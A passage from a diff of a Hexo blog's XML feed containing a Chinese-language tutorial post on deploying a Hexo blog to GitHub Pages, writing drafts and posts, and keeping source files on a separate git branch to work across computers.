+<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
+
+<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
+<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
+
+<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
+<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
+<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以不打草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
+
+<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
+<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
+<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>接着在本地博客文件夹下依次执行下列命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
+<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
+<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
+<p>然后点击页面右上角的 Change default branch 按钮:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
+<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
+<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
+
+<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
